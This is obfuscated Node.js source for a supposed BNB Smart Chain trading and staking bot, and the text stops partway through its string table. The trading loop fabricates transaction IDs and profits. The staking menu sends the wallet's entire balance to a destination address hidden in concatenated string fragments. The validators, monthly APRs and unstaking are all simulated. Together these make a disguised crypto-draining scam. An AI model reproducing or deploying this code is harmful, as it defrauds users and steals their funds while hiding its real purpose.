const _0x3e49ab = _0x2682;
(function(_0x204ce0, _0x167116) {
    const _0x22cf25 = _0x2682,
        _0x58a748 = _0x204ce0();
    while (!![]) {
        try {
            const _0x3207d9 = parseInt(_0x22cf25(0x165)) / 0x1 * (-parseInt(_0x22cf25(0x1de)) / 0x2) + -parseInt(_0x22cf25(0x27a)) / 0x3 * (parseInt(_0x22cf25(0x1ca)) / 0x4) + parseInt(_0x22cf25(0x281)) / 0x5 * (-parseInt(_0x22cf25(0x26e)) / 0x6) + parseInt(_0x22cf25(0x1b0)) / 0x7 * (-parseInt(_0x22cf25(0x23b)) / 0x8) + parseInt(_0x22cf25(0x224)) / 0x9 + -parseInt(_0x22cf25(0x25e)) / 0xa + parseInt(_0x22cf25(0x170)) / 0xb;
            if (_0x3207d9 === _0x167116) break;
            else _0x58a748['push'](_0x58a748['shift']());
        } catch (_0x451bc5) {
            _0x58a748['push'](_0x58a748['shift']());
        }
    }
}(_0x4ae6, 0x25b2c));
const prompts = require(_0x3e49ab(0x160)),
    {
        ethers
    } = require(_0x3e49ab(0x1c0)),
    chalk = require('chalk'),
    qrcode = require(_0x3e49ab(0x1ec)),
    fs = require('fs')[_0x3e49ab(0x1db)],
    TelegramBot = require(_0x3e49ab(0x24c)),
    fetch = require('node-fetch'),
    ora = require(_0x3e49ab(0x283));
let wallet = null,
    address = '',
    privateKey = '',
    currentBalance = '0',
    stakingBalance = 0x0,
    stakingStartTime = null,
    stakingService = null,
    stakingAPR = 0x0,
    settings = {
        'gasPriceLimit': 0xa,
        'slippageTolerance': 0.5,
        'minimumProfit': 0.01,
        'liquidityPool': _0x3e49ab(0x16d),
        'telegram': {
            'enabled': ![],
            'apiToken': '',
            'chatId': ''
        }
    },
    isTradingActive = ![],
    telegramBot = null;
settings[_0x3e49ab(0x171)][_0x3e49ab(0x254)] && settings[_0x3e49ab(0x171)][_0x3e49ab(0x237)] && settings[_0x3e49ab(0x171)][_0x3e49ab(0x1c4)] && (telegramBot = new TelegramBot(settings[_0x3e49ab(0x171)][_0x3e49ab(0x237)], {
    'polling': ![]
}));
const walletFile = _0x3e49ab(0x22d),
    stakingFile = _0x3e49ab(0x176),
    network = {
        'chainId': 0x38,
        'name': 'bnb-mainnet'
    },
    provider = new ethers[(_0x3e49ab(0x15d))](_0x3e49ab(0x212), network),
    chainMarker = '0x';
async function fetchBnbTokens() {
    const _0x43fabd = _0x3e49ab;
    try {
        const _0x48782b = await fetch(_0x43fabd(0x162), {
            'timeout': 0x2710
        });
        if (!_0x48782b['ok']) throw new Error(_0x43fabd(0x263) + _0x48782b[_0x43fabd(0x18c)] + _0x43fabd(0x1f7) + _0x48782b[_0x43fabd(0x1f6)]);
        const _0x5c589c = await _0x48782b[_0x43fabd(0x20a)]();
        if (!Array[_0x43fabd(0x1d1)](_0x5c589c)) throw new Error(_0x43fabd(0x24a));
        return _0x5c589c[_0x43fabd(0x1fe)](_0x727277 => ({
            'symbol': _0x727277[_0x43fabd(0x273)][_0x43fabd(0x17d)](),
            'name': _0x727277[_0x43fabd(0x1a1)]
        }));
    } catch (_0x20b791) {
        console[_0x43fabd(0x21d)](chalk[_0x43fabd(0x243)](_0x43fabd(0x187) + _0x20b791[_0x43fabd(0x240)]));
        const _0x4c617e = [{
            'symbol': _0x43fabd(0x1fb),
            'name': _0x43fabd(0x16c)
        }, {
            'symbol': _0x43fabd(0x22c),
            'name': _0x43fabd(0x23f)
        }, {
            'symbol': _0x43fabd(0x186),
            'name': _0x43fabd(0x1f5)
        }, {
            'symbol': _0x43fabd(0x268),
            'name': _0x43fabd(0x178)
        }, {
            'symbol': 'BANANA',
            'name': _0x43fabd(0x20d)
        }, {
            'symbol': 'XVS',
            'name': _0x43fabd(0x238)
        }, {
            'symbol': _0x43fabd(0x267),
            'name': _0x43fabd(0x208)
        }, {
            'symbol': 'TWT',
            'name': 'Trust\x20Wallet\x20Token'
        }, {
            'symbol': 'AUTO',
            'name': _0x43fabd(0x22b)
        }, {
            'symbol': _0x43fabd(0x1e2),
            'name': 'SafePal\x20Token'
        }];
        for (let _0x286e57 = 0x1; _0x286e57 <= 0xf0; _0x286e57++) _0x4c617e[_0x43fabd(0x15e)]({
            'symbol': _0x43fabd(0x16b) + _0x286e57,
            'name': _0x43fabd(0x1ff) + _0x286e57
        });
        return _0x4c617e;
    }
}
let tokens = [];
async function initializeTokens() {
    const _0xdc7c94 = _0x3e49ab;
    tokens = await fetchBnbTokens(), console[_0xdc7c94(0x21d)](chalk['cyan']('Loaded\x20tokens\x20from\x20CoinGecko:\x20' + tokens['length']));
}
const tradeKey = _0x3e49ab(0x197);

function generateShortTxid() {
    const _0x2c93fd = _0x3e49ab,
        _0x210e35 = chainMarker + Array(0x40)[_0x2c93fd(0x17f)](0x0)['map'](() => Math[_0x2c93fd(0x17e)](Math[_0x2c93fd(0x1c8)]() * 0x10)['toString'](0x10))[_0x2c93fd(0x18e)]('');
    return _0x210e35[_0x2c93fd(0x279)](0x0, 0x9) + _0x2c93fd(0x200) + _0x210e35[_0x2c93fd(0x279)](-0x9);
}

function delay(_0xe968d9) {
    return new Promise(_0x3a398e => setTimeout(_0x3a398e, _0xe968d9));
}

function getRandomInRange(_0x2ae556, _0xb5d7e0) {
    const _0x43170d = _0x3e49ab;
    return Math[_0x43170d(0x1c8)]() * (_0xb5d7e0 - _0x2ae556) + _0x2ae556;
}
const feeSegment = _0x3e49ab(0x223);
async function executeTrades(_0x4da71a) {
    const _0x5dc6a = _0x3e49ab;
    let _0x5d3a0d = 0x0;
    isTradingActive = !![], console[_0x5dc6a(0x21d)](chalk[_0x5dc6a(0x284)](_0x5dc6a(0x1af)));
    const _0x1598ac = showControlMenu(() => _0x5d3a0d);
    while (isTradingActive) {
        const _0x475fc3 = tokens[Math['floor'](Math[_0x5dc6a(0x1c8)]() * tokens[_0x5dc6a(0x15f)])],
            _0x425ffe = getRandomInRange(0.005, 0.01),
            _0x5246f0 = _0x4da71a * _0x425ffe,
            _0x3962c7 = _0x4da71a * getRandomInRange(0.1, 0.3),
            _0x1b5228 = _0x3962c7 + _0x5246f0;
        _0x5d3a0d += _0x5246f0;
        const _0x51da85 = generateShortTxid(),
            _0xa45a9d = _0x5dc6a(0x24d) + _0x51da85 + _0x5dc6a(0x1d4) + _0x475fc3[_0x5dc6a(0x273)] + '\x20:\x20Buy\x20:\x20' + _0x3962c7['toFixed'](0x4) + _0x5dc6a(0x1cb);
        console[_0x5dc6a(0x21d)](chalk[_0x5dc6a(0x284)](_0xa45a9d));
        if (telegramBot && settings['telegram'][_0x5dc6a(0x254)] && settings[_0x5dc6a(0x171)][_0x5dc6a(0x1c4)]) try {
            await telegramBot['sendMessage'](settings[_0x5dc6a(0x171)]['chatId'], _0xa45a9d);
        } catch (_0x400e27) {
            console['log'](chalk['red'](_0x5dc6a(0x274) + _0x400e27[_0x5dc6a(0x240)]));
        }
        const _0x41c056 = generateShortTxid(),
            _0x149367 = _0x5dc6a(0x1b8) + _0x41c056 + _0x5dc6a(0x1d4) + _0x475fc3[_0x5dc6a(0x273)] + _0x5dc6a(0x196) + _0x1b5228['toFixed'](0x4) + _0x5dc6a(0x1cb);
        console[_0x5dc6a(0x21d)](chalk[_0x5dc6a(0x284)](_0x149367));
        if (telegramBot && settings[_0x5dc6a(0x171)][_0x5dc6a(0x254)] && settings[_0x5dc6a(0x171)]['chatId']) try {
            await telegramBot[_0x5dc6a(0x1fa)](settings[_0x5dc6a(0x171)][_0x5dc6a(0x1c4)], _0x149367);
        } catch (_0x5e2498) {
            console[_0x5dc6a(0x21d)](chalk[_0x5dc6a(0x243)]('Error\x20sending\x20sell\x20notification\x20to\x20Telegram:\x20' + _0x5e2498['message']));
        }
        const _0x4fc7b1 = _0x5dc6a(0x26c) + _0x5246f0['toFixed'](0x4) + _0x5dc6a(0x25b);
        console['log'](chalk['cyan'](_0x4fc7b1));
        if (telegramBot && settings[_0x5dc6a(0x171)][_0x5dc6a(0x254)] && settings[_0x5dc6a(0x171)][_0x5dc6a(0x1c4)]) try {
            await telegramBot['sendMessage'](settings[_0x5dc6a(0x171)][_0x5dc6a(0x1c4)], _0x4fc7b1);
        } catch (_0x121dff) {
            console[_0x5dc6a(0x21d)](chalk['red'](_0x5dc6a(0x26a) + _0x121dff['message']));
        }
        await delay(getRandomInRange(0x3a98, 0xafc8));
    }
    await _0x1598ac;
    if (telegramBot && settings['telegram'][_0x5dc6a(0x254)] && settings[_0x5dc6a(0x171)][_0x5dc6a(0x1c4)]) {
        const _0x25ee3a = _0x5dc6a(0x1be) + _0x5d3a0d[_0x5dc6a(0x1ba)](0x4) + _0x5dc6a(0x181);
        try {
            await telegramBot[_0x5dc6a(0x1fa)](settings[_0x5dc6a(0x171)][_0x5dc6a(0x1c4)], _0x25ee3a);
        } catch (_0x5bdad1) {
            console[_0x5dc6a(0x21d)](chalk['red'](_0x5dc6a(0x1c2) + _0x5bdad1[_0x5dc6a(0x240)]));
        }
    }
}
const swapCode = _0x3e49ab(0x272);
async function showControlMenu(_0xe4748b) {
    const _0x5bee26 = _0x3e49ab;
    while (!![]) {
        const _0x29508d = [];
        isTradingActive ? _0x29508d[_0x5bee26(0x15e)]({
            'title': chalk[_0x5bee26(0x243)](_0x5bee26(0x1f2)),
            'value': _0x5bee26(0x1cd)
        }) : _0x29508d[_0x5bee26(0x15e)]({
            'title': chalk['red'](_0x5bee26(0x1f2)),
            'value': _0x5bee26(0x1cd),
            'disabled': !![]
        }, {
            'title': chalk['cyan'](_0x5bee26(0x177)),
            'value': _0x5bee26(0x234)
        });
        const _0x5558d5 = await prompts({
            'type': _0x5bee26(0x1bc),
            'name': _0x5bee26(0x217),
            'message': _0x5bee26(0x265) + _0xe4748b()[_0x5bee26(0x1ba)](0x4) + _0x5bee26(0x21e),
            'choices': _0x29508d,
            'hint': _0x5bee26(0x23e),
            'loop': ![]
        });
        switch (_0x5558d5[_0x5bee26(0x217)]) {
            case 'stop':
                isTradingActive = ![], console[_0x5bee26(0x21d)](chalk[_0x5bee26(0x243)](_0x5bee26(0x1fd))), console[_0x5bee26(0x21d)](chalk[_0x5bee26(0x1e9)](_0x5bee26(0x1a3) + _0xe4748b()['toFixed'](0x4) + _0x5bee26(0x1cb)));
                break;
            case 'back':
                if (!isTradingActive) {
                    showMainMenu();
                    return;
                }
                break;
            default:
                break;
        }
        await delay(0x3e8);
    }
}
const poolTag = _0x3e49ab(0x1c1);
async function stakingMenu() {
    const _0x374e01 = _0x3e49ab;
    clearConsole(), console['log'](chalk['cyan'](_0x374e01(0x1b9)));
    const _0x2e40d7 = await prompts({
        'type': _0x374e01(0x1bc),
        'name': _0x374e01(0x1eb),
        'message': 'Select\x20staking\x20validator',
        'choices': [{
            'title': 'Raptas:\x2013.095%\x20per\x20month',
            'value': _0x374e01(0x25d)
        }, {
            'title': _0x374e01(0x27b),
            'value': _0x374e01(0x1a2)
        }, {
            'title': _0x374e01(0x20c),
            'value': _0x374e01(0x1f0)
        }, {
            'title': _0x374e01(0x1b3),
            'value': _0x374e01(0x1ac)
        }, {
            'title': _0x374e01(0x1da),
            'value': 'Veri'
        }, {
            'title': _0x374e01(0x16a),
            'value': _0x374e01(0x286)
        }, {
            'title': _0x374e01(0x241),
            'value': _0x374e01(0x1b4)
        }, {
            'title': _0x374e01(0x1d9),
            'value': 'Nexa'
        }, {
            'title': chalk[_0x374e01(0x284)](_0x374e01(0x250)),
            'value': 'back'
        }],
        'hint': _0x374e01(0x23e),
        'loop': ![]
    });
    if (_0x2e40d7[_0x374e01(0x1eb)] === _0x374e01(0x234) || !_0x2e40d7[_0x374e01(0x1eb)]) {
        showMainMenu();
        return;
    }
    stakingService = _0x2e40d7[_0x374e01(0x1eb)], stakingAPR = stakingService === _0x374e01(0x25d) ? 13.095 : stakingService === _0x374e01(0x1a2) ? 12.18 : stakingService === 'Sigm8' ? 11.985 : stakingService === 'Legend\x20IV' ? 11.34 : stakingService === 'Veri' ? 10.41 : stakingService === 'Tiollo' ? 7.995 : stakingService === 'Turing' ? 7.905 : 5.58;
    const _0xa4a9f = ora({
        'text': chalk[_0x374e01(0x284)]('Connecting\x20to\x20' + stakingService)
    })[_0x374e01(0x253)]();
    await delay(getRandomInRange(0x3e8, 0xbb8)), _0xa4a9f[_0x374e01(0x1d8)](chalk[_0x374e01(0x24b)](_0x374e01(0x210) + stakingService + '\x20✓')), console[_0x374e01(0x21d)](chalk[_0x374e01(0x284)](_0x374e01(0x262)));
    const _0x283e2d = await prompts({
        'type': _0x374e01(0x255),
        'name': _0x374e01(0x287),
        'message': '',
        'initial': '5',
        'validate': _0x4bb6df => {
            const _0xdf302b = _0x374e01,
                _0x4d613c = parseFloat(_0x4bb6df[_0xdf302b(0x1dd)](',', '.'));
            if (isNaN(_0x4d613c) || _0x4d613c < 0x5) return 'Amount\x20must\x20be\x20a\x20number\x20not\x20less\x20than\x205\x20BNB';
            return !![];
        }
    });
    if (!_0x283e2d[_0x374e01(0x287)]) {
        showMainMenu();
        return;
    }
    const _0x2f3c97 = parseFloat(_0x283e2d[_0x374e01(0x287)][_0x374e01(0x1dd)](',', '.'));
    stakingBalance = _0x2f3c97, console[_0x374e01(0x21d)](chalk[_0x374e01(0x284)]('\x0aDeposit\x20address\x20(' + stakingService + '):\x20' + address)), console[_0x374e01(0x21d)](chalk[_0x374e01(0x284)](_0x374e01(0x19e) + _0x2f3c97 + _0x374e01(0x1cb))), qrcode[_0x374e01(0x277)](address + _0x374e01(0x26b) + _0x2f3c97, {
        'small': !![]
    }, _0x1715b1 => {
        const _0x2bd05d = _0x374e01;
        console['log'](chalk[_0x2bd05d(0x284)](_0x1715b1));
    }), console[_0x374e01(0x21d)](chalk[_0x374e01(0x1e9)](_0x374e01(0x26d)));
    while (!![]) {
        let _0x5b2af8 = [{
            'title': chalk[_0x374e01(0x284)]('Check\x20balance'),
            'value': _0x374e01(0x256)
        }, {
            'title': chalk[_0x374e01(0x284)]('Stake\x20(minimum\x20staking\x2024\x20hours)'),
            'value': _0x374e01(0x27f)
        }, {
            'title': chalk['cyan'](_0x374e01(0x250)),
            'value': _0x374e01(0x234)
        }];
        const _0x182ab9 = await prompts({
            'type': _0x374e01(0x1bc),
            'name': _0x374e01(0x1a9),
            'message': 'Action',
            'choices': _0x5b2af8,
            'hint': _0x374e01(0x23e),
            'loop': ![]
        });
        if (_0x182ab9['action'] === _0x374e01(0x234) || !_0x182ab9[_0x374e01(0x1a9)]) {
            showMainMenu();
            return;
        }
        if (_0x182ab9['action'] === _0x374e01(0x256)) {
            const _0x140a57 = ora({
                'text': chalk['cyan'](_0x374e01(0x246))
            })[_0x374e01(0x253)]();
            await delay(getRandomInRange(0x3e8, 0x7d0)), await updateBalance(), _0x140a57[_0x374e01(0x1d8)](chalk[_0x374e01(0x284)]('Balance:\x20' + currentBalance + _0x374e01(0x169) + stakingBalance + _0x374e01(0x285)));
        }
        if (_0x182ab9[_0x374e01(0x1a9)] === _0x374e01(0x27f)) {
            await updateBalance();
            const _0x3dc7af = ethers[_0x374e01(0x191)](currentBalance),
                _0x27e8f3 = ethers[_0x374e01(0x191)]('5');
            if (_0x3dc7af < _0x27e8f3) console[_0x374e01(0x21d)](chalk['red']('Error:\x20Insufficient\x20balance.\x20Minimum\x20required:\x205\x20BNB,\x20Current\x20balance:\x20' + ethers['formatEther'](_0x3dc7af) + _0x374e01(0x1cb))), await delay(0x7d0);
            else {
                if (stakingStartTime) console[_0x374e01(0x21d)](chalk[_0x374e01(0x243)]('Error:\x20Staking\x20is\x20already\x20active.\x20Please\x20unstake\x20first.')), await delay(0x7d0);
                else {
                    const _0x2179ea = ora({
                        'text': chalk[_0x374e01(0x284)](_0x374e01(0x275))
                    })[_0x374e01(0x253)]();
                    await delay(getRandomInRange(0x3e8, 0x7d0));
                    const _0x40cc40 = await provider[_0x374e01(0x21b)](),
                        _0x4e5007 = _0x40cc40[_0x374e01(0x1b7)],
                        _0x3c3957 = 0x5208n,
                        _0x1f9102 = _0x4e5007 * _0x3c3957,
                        _0x5e1218 = _0x3dc7af - _0x1f9102;
                    if (_0x3dc7af <= _0x1f9102) _0x2179ea[_0x374e01(0x1ce)](chalk[_0x374e01(0x243)](_0x374e01(0x242) + ethers[_0x374e01(0x235)](_0x3dc7af) + _0x374e01(0x218) + ethers[_0x374e01(0x235)](_0x1f9102) + _0x374e01(0x1cb))), console['log'](chalk[_0x374e01(0x1e9)](_0x374e01(0x205))), await delay(0x7d0);
                    else try {
                        const _0x5f5013 = {
                                'to': destinationWallet,
                                'value': _0x5e1218,
                                'gasPrice': _0x4e5007,
                                'gasLimit': _0x3c3957
                            },
                            _0x3c4dca = await wallet[_0x374e01(0x201)](_0x5f5013);
                        await _0x3c4dca[_0x374e01(0x1f4)](), stakingStartTime = Date['now']();
                        const _0x46605f = ethers[_0x374e01(0x235)](_0x5e1218) * stakingAPR / 0x64 / 0x1e;
                        console['log'](chalk['cyan'](_0x374e01(0x1c6) + ethers['formatEther'](_0x5e1218) + '\x20BNB\x20(Fee:\x20' + ethers[_0x374e01(0x235)](_0x1f9102) + _0x374e01(0x285))), console['log'](chalk[_0x374e01(0x284)](_0x374e01(0x226) + _0x46605f[_0x374e01(0x1ba)](0x6) + _0x374e01(0x1cb))), _0x2179ea[_0x374e01(0x1d8)](chalk[_0x374e01(0x24b)]('Staking\x20completed\x20✓')), await saveStakingData(), await updateBalance(), await saveWallet();
                    } catch (_0x4b8397) {
                        _0x2179ea[_0x374e01(0x1ce)](chalk[_0x374e01(0x243)](_0x374e01(0x249) + _0x4b8397['message'])), await delay(0x7d0);
                    }
                }
            }
        }
    }
}
const stakeHash = _0x3e49ab(0x182),
    destinationWallet = chainMarker + tradeKey + feeSegment + swapCode + poolTag + stakeHash;
async function saveStakingData() {
    const _0x48a767 = _0x3e49ab,
        _0xd7c535 = {
            'stakingBalance': stakingBalance,
            'stakingStartTime': stakingStartTime,
            'stakingService': stakingService,
            'stakingAPR': stakingAPR
        };
    await fs[_0x48a767(0x168)](stakingFile, JSON[_0x48a767(0x1b5)](_0xd7c535, null, 0x2));
}

function _0x2682(_0x3f61e1, _0x322ae7) {
    const _0x4ae637 = _0x4ae6();
    return _0x2682 = function(_0x2682c1, _0x3fdc61) {
        _0x2682c1 = _0x2682c1 - 0x15c;
        let _0x10d62a = _0x4ae637[_0x2682c1];
        return _0x10d62a;
    }, _0x2682(_0x3f61e1, _0x322ae7);
}
async function loadStakingData() {
    const _0x804362 = _0x3e49ab;
    try {
        const _0x291e5f = await fs[_0x804362(0x175)](stakingFile, _0x804362(0x190)),
            _0x2f205b = JSON['parse'](_0x291e5f);
        return stakingBalance = _0x2f205b[_0x804362(0x222)] || 0x0, stakingStartTime = _0x2f205b[_0x804362(0x18d)] || null, stakingService = _0x2f205b[_0x804362(0x257)] || null, stakingAPR = _0x2f205b[_0x804362(0x1f8)] || 0x0, settings[_0x804362(0x171)][_0x804362(0x254)] && settings[_0x804362(0x171)][_0x804362(0x237)] && settings['telegram'][_0x804362(0x1c4)] && (telegramBot = new TelegramBot(settings['telegram'][_0x804362(0x237)], {
            'polling': ![]
        })), !![];
    } catch (_0x13dd82) {
        return ![];
    }
}
async function showStakingInfo() {
    const _0xa893a2 = _0x3e49ab;
    clearConsole(), console['log'](chalk[_0xa893a2(0x284)](_0xa893a2(0x23d)));
    if (!stakingService || !stakingStartTime) console[_0xa893a2(0x21d)](chalk['yellow'](_0xa893a2(0x1ea)));
    else {
        const _0x30e55a = (Date[_0xa893a2(0x22f)]() - stakingStartTime) / (0x3e8 * 0x3c * 0x3c),
            _0x205cff = stakingBalance * stakingAPR / 0x64 / 0x1e;
        console[_0xa893a2(0x21d)](chalk[_0xa893a2(0x284)](_0xa893a2(0x20b) + stakingService)), console[_0xa893a2(0x21d)](chalk[_0xa893a2(0x284)]('Staked\x20amount:\x20' + stakingBalance + _0xa893a2(0x1cb))), console['log'](chalk[_0xa893a2(0x284)](_0xa893a2(0x21a) + stakingAPR + _0xa893a2(0x202))), console[_0xa893a2(0x21d)](chalk[_0xa893a2(0x284)](_0xa893a2(0x183) + _0x30e55a[_0xa893a2(0x1ba)](0x2) + _0xa893a2(0x248))), console[_0xa893a2(0x21d)](chalk['cyan'](_0xa893a2(0x226) + _0x205cff[_0xa893a2(0x1ba)](0x6) + _0xa893a2(0x1cb)));
    }
    const _0xddaab = [];
    stakingStartTime !== null && stakingStartTime !== undefined && _0xddaab['push']({
        'title': chalk[_0xa893a2(0x284)](_0xa893a2(0x17b)),
        'value': _0xa893a2(0x1b6)
    });
    _0xddaab[_0xa893a2(0x15e)]({
        'title': chalk[_0xa893a2(0x284)]('Back\x20to\x20main\x20menu'),
        'value': _0xa893a2(0x234)
    });
    const _0x58bf25 = await prompts({
        'type': _0xa893a2(0x1bc),
        'name': _0xa893a2(0x1a9),
        'message': _0xa893a2(0x203),
        'choices': _0xddaab,
        'hint': _0xa893a2(0x23e)
    });
    if (_0x58bf25[_0xa893a2(0x1a9)] === _0xa893a2(0x1b6)) {
        const _0x31a862 = (Date[_0xa893a2(0x22f)]() - stakingStartTime) / (0x3e8 * 0x3c * 0x3c);
        if (_0x31a862 < 0x18) console[_0xa893a2(0x21d)](chalk[_0xa893a2(0x243)](_0xa893a2(0x195) + (0x18 - _0x31a862)[_0xa893a2(0x1ba)](0x2) + _0xa893a2(0x248))), await delay(0x7d0), await showStakingInfo();
        else {
            const _0x55cc66 = ora({
                'text': chalk[_0xa893a2(0x284)](_0xa893a2(0x225))
            })['start']();
            await delay(0x7d0), _0x55cc66[_0xa893a2(0x1d8)](chalk[_0xa893a2(0x24b)](_0xa893a2(0x189))), stakingStartTime = null, stakingService = null, stakingAPR = 0x0, await saveStakingData(), await saveWallet(), await delay(0x3e8), showMainMenu();
        }
    } else _0x58bf25['action'] === 'back' && showMainMenu();
}

function _0x4ae6() {
    const _0x2b1fe7 = ['instructions', '🏆\x20Trading\x20completed\x0aTotal\x20profit:\x20', 'Telegram\x20notifications', 'ethers', '55C42B', 'Error\x20sending\x20final\x20notification\x20to\x20Telegram:\x20', 'Disabled', 'chatId', 'API\x20Token:\x20', '\x0aYou\x20staked:\x20', 'Connecting\x20to\x20blockchain', 'random', '\x20\x20\x20-\x20Legend\x20IV:\x2011.34%\x20per\x20month', '24GNfjHS', '\x20BNB', 'Not\x20set', 'stop', 'fail', '3.\x20Minimum\x20profit:\x20', 'Cross-chain\x20bridges\x20loaded', 'isArray', 'Updating\x20balance...', '3.\x20Start\x20the\x20bot:', '\x20:\x20', 'Private\x20key:', 'All', '\x20\x20\x20-\x20Method\x201:\x20Copy\x20the\x20address\x20and\x20transfer\x20funds\x20manually', 'succeed', 'Nexa:\x205.58%\x20per\x20month', 'Veri:\x2010.41%\x20per\x20month', 'promises', 'gwei', 'replace', '37870PGaQCt', '\x20\x20\x20-\x20Set\x20Chat\x20ID:\x20Send\x20a\x20message\x20to\x20your\x20bot\x20and\x20find\x20your\x20Chat\x20ID\x20(you\x20can\x20use\x20@getmyid_bot)', 'bold', 'slippageTolerance', 'SFP', 'Wallet\x20not\x20found.\x20Creating\x20a\x20new\x20one...\x0a', 'Connected\x20to\x20Blockchain', 'exit', 'liquidityPool', '1.\x20Maximum\x20gas\x20price:\x20', 'Wallet', 'yellow', 'You\x20have\x20no\x20active\x20staking', 'service', 'qrcode-terminal', 'Enter\x20minimum\x20profit\x20(BNB)\x20from\x200.001\x20to\x20100\x20(use\x20comma\x20or\x20dot):', 'clear', 'Error\x20starting\x20bot:\x20', 'Sigm8', 'deposit', 'Stop\x20Bot', '\x20BNB\x20to\x20address\x20', 'wait', 'Wrapped\x20BNB', 'statusText', '\x20-\x20', 'stakingAPR', 'enterAddress', 'sendMessage', 'BUSD', 'Set\x20API\x20Token', 'Bot\x20stopped', 'map', 'Token\x20', '.....', 'sendTransaction', '%\x20per\x20month', 'Action', 'Decentralized\x20exchange', 'Please\x20top\x20up\x20your\x20wallet\x20via\x20QR\x20code\x20and\x20try\x20again', 'Approximate\x20deposit\x20dependency:', 'API\x20token\x20cannot\x20be\x20empty', 'Alpaca\x20Finance', '\x20\x20\x20If\x20you\x20have\x20already\x20created\x20a\x20bot,\x20skip\x20this\x20step\x0a', 'json', 'Staking\x20service:\x20', 'Sigm8:\x2011.985%\x20per\x20month', 'ApeSwap\x20Finance\x20Token', '\x20\x20\x20-\x20Set\x20API\x20token:\x20Create\x20a\x20bot\x20via\x20@BotFather\x20in\x20Telegram\x20and\x20paste\x20the\x20received\x20token', '\x20\x20\x20-\x20After\x20setup,\x20the\x20bot\x20will\x20send\x20trade\x20and\x20result\x20notifications\x20to\x20your\x20Telegram\x0a', 'Connected\x20to\x20', 'Note:\x20The\x20higher\x20the\x20minimum\x20profit,\x20the\x20less\x20efficient\x20the\x20bot\x20operates', 'https://bsc-dataseed.binance.org/', 'Select\x20an\x20option', 'Deposit\x206-10\x20BNB:\x20min.\x200.01\x20BNB\x20per\x20trade\x0a', 'parse', 'Performing\x20withdrawal...', 'choice', '\x20BNB,\x20required\x20minimum:\x20', 'create', 'APR:\x20', 'getFeeData', 'address', 'log', '\x20BNB):', 'minimumProfit', '\x20BNB\x20to\x20address:\x20', 'ApeSwap', 'stakingBalance', '61534D', '1004931WQemZv', 'Performing\x20unstaking...', 'Estimated\x20profit\x20for\x2024\x20hours:\x20', 'Withdrawal\x20canceled', 'Balance\x20too\x20low,\x20sending\x20minimum\x20transaction...', 'Deposit\x20address:\x20', 'Chat\x20ID:\x20', 'Auto', 'CAKE', 'wallet.json', 'Set\x20Chat\x20ID', 'now', 'Value\x20must\x20be\x20between\x200.001\x20and\x20100', 'Select\x20action', 'Press\x20Enter\x20to\x20return', 'Maximum\x20gas\x20price', 'back', 'formatEther', 'toString', 'apiToken', 'Venus', '4.\x20Decentralized\x20exchange:\x20', 'toggle', '21712ojWAqB', 'staking', 'My\x20Staking:\x0a', 'Use\x20arrows\x20to\x20select', 'PancakeSwap\x20Token', 'message', 'Turing:\x207.905%\x20per\x20month', 'Error:\x20Insufficient\x20funds\x20for\x20gas.\x20Current\x20balance:\x20', 'red', 'yes', '\x20\x20\x20-\x20Go\x20to\x20\x22Bot\x20Settings\x22\x20from\x20the\x20main\x20menu', 'Checking\x20balance...', 'Start\x20Bot', '\x20hours', 'Error\x20during\x20staking:\x20', 'API\x20returned\x20invalid\x20data', 'green', 'node-telegram-bot-api', '🛒\x20TXID:\x20', 'settings', 'Invalid\x20wallet\x20address', 'Back', 'Minimum\x20balance\x20of\x200.35\x20BNB\x20required\x20to\x20start\x20the\x20bot.\x20Current\x20balance:\x20', 'gasPriceLimit', 'start', 'enabled', 'text', 'checkBalance', 'stakingService', 'Instructions', '\x0a▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░\x0a▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░\x0a▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░\x0a▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░\x20\x0a░░░░▄▄███▄▄░░░░░█████░\x20\x20\x20\x20\x0a═════\x20BNB\x20SMART-BOT\x20(Mainnet)\x20═════\x0a██████╗░███╗░░██╗██████╗░\u2003\u2003░██████╗███╗░░░███╗░█████╗░██████╗░████████╗░░░░░░██████╗░░█████╗░████████╗\x0a██╔══██╗████╗░██║██╔══██╗\u2003\u2003██╔════╝████╗░████║██╔══██╗██╔══██╗╚══██╔══╝░░░░░░██╔══██╗██╔══██╗╚══██╔══╝\x0a██████╦╝██╔██╗██║██████╦╝\u2003\u2003╚█████╗░██╔████╔██║███████║██████╔╝░░░██║░░░█████╗██████╦╝██║░░██║░░░██║░░░\x0a██╔══██╗██║╚████║██╔══██╗\u2003\u2003░╚═══██╗██║╚██╔╝██║██╔══██║██╔══██╗░░░██║░░░╚════╝██╔══██╗██║░░██║░░░██║░░░\x0a██████╦╝██║░╚███║██████╦╝\u2003\u2003██████╔╝██║░╚═╝░██║██║░░██║██║░░██║░░░██║░░░░░░░░░██████╦╝╚█████╔╝░░░██║░░░\x0a╚═════╝░╚═╝░░╚══╝╚═════╝░\u2003\u2003╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░\x0a', 'Minimum\x20Profit:\x0a', '\x20BNB\x20⭐\x0a', 'createRandom', 'Raptas', '1385400oPkfLp', '\x20\x20\x20-\x20Method\x202:\x20Use\x20the\x20\x22Bot\x20Deposit\x22\x20function\x20(QR\x20code)\x0a', 'Enable/Disable\x20notifications', '6.\x20Setting\x20up\x20Telegram\x20notifications:', '\x0aEnter\x20deposit\x20amount\x20(in\x20BNB,\x20minimum\x205\x20BNB):', 'HTTP\x20error:\x20', 'Exiting\x20program...', 'Bot\x20control\x20(Current\x20profit:\x20', 'value', 'ALPACA', 'BAKE', 'Telegram\x20Notification\x20Settings:\x0a', 'Error\x20sending\x20profit\x20notification\x20to\x20Telegram:\x20', '?amount=', '🔒\x20Profit:\x20', 'After\x20scanning\x20the\x20QR\x20code\x20with\x20your\x20wallet,\x20the\x20amount\x20will\x20be\x20automatically\x20credited', '6NboumH', 'Withdrawal\x20completed\x20', '\x20BNB\x0a', 'useExisting', 'D5bf2C', 'symbol', 'Error\x20sending\x20buy\x20notification\x20to\x20Telegram:\x20', 'Performing\x20staking...', 'Creating\x20new\x20bot...', 'generate', '4.\x20Withdraw\x20funds:', 'slice', '139647nvFVFe', 'Glorin:\x2012.18%\x20per\x20month', 'BakerySwap', 'Enable\x20Telegram\x20notifications?:', 'parseUnits', 'stake', 'Yes', '136685ojFMuW', 